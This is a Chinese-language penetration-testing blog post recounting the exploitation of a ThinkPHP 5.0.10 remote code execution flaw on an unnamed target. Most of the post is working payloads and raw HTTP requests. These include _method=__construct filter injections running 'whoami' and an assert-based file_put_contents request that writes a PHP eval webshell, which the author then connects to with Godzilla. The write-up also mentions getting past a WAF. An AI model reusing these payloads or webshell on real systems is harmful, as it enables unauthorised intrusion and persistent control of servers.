#  攻防渗透 | 难得的thinkphp5 rce记录  
安全艺术
                    安全艺术  安全艺术   2026-05-20 13:00  
  
开局  
xray  
扫出  
thinkphp rce  
漏洞：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/X5epWh2K2OqtXDplD1rPia9joTcRqxyD8Y9tttib66mShuFFeLibhkgFVRiaxZTppUGWKfATBj3PAclcByj9YzA9rA/640?wx_fmt=png "")  
  
复制  
request  
放到  
burp  
进行利用：  
```
POST / HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Content-Length: 59
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

_method=__construct&method=GET&filter[]=system&get[]=whoami
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/X5epWh2K2OqtXDplD1rPia9joTcRqxyD8EehcnBQVz7RtT6hk21fg5IZN4Pg40fsdb8m2ibL0rg2BL0oicwKDASuA/640?wx_fmt=png "")  
  
返回版本  
5.0.10  
，那就把  
5.0.10  
的  
poc  
全打一遍  
  
s=whoami&_method=__construct&method=POST&filter[]=system  
  
aaaa=whoami&_method=__construct&method=GET&filter[]=system  
  
_method=__construct&method=GET&filter[]=system&get[]=whoami  
  
![](https://mmbiz.qpic.cn/mmbiz_png/X5epWh2K2OqtXDplD1rPia9joTcRqxyD8EsmV7cRH6iaemGGDDhN3eZfrxBichsTRbFx2HCYHAw8oh8M5PzAdfFnw/640?wx_fmt=png "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/X5epWh2K2OqtXDplD1rPia9joTcRqxyD8SsBYkLibOZDdzT0Nr6lejqojibNbO35EDx0Zx5rH4m87LL3IGy2zzGaQ/640?wx_fmt=png "")  
  
都失败了，尝试了三次后，发现目标无法访问了，应该是被  
waf  
拦截了，当时搁置了几天，后来听同事说也发现了这个漏洞但是无法利用，后续就开始查阅资料，尝试进行利用，看到有些文章里有提到写webshell，赶紧尝试下：  
  
s=file_put_contents('sectest.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert  
  
成功写入  
phpinfo  
：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/X5epWh2K2OqtXDplD1rPia9joTcRqxyD8w7ZOWZ69Mghk9jfKhg4WkibvPV9Liauv2oBZtQWnH0bs25MvXHC22LVw/640?wx_fmt=png "")  
  
开始直接写的冰蝎马，发现连不上，再尝试写哥斯拉马，成功连上了：  
```
POST / HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Content-Length: 127
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

s=file_put_contents('sectest20230220.php','<?php
eval($_POST["pass2023"]);
')&_method=__construct&method=POST&filter[]=assert
```  
  
直接连接：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/X5epWh2K2OqtXDplD1rPia9joTcRqxyD8UaeCg2A1Mcjx727NVJOXMGgWiacMlRAMiaMEZTic1kPqCpkFK9uBxKtbg/640?wx_fmt=png "")  
  
在测试的过程中要多翻翻资料，利用方法也要都尝试一下，也许就柳暗花明了呢。  
  
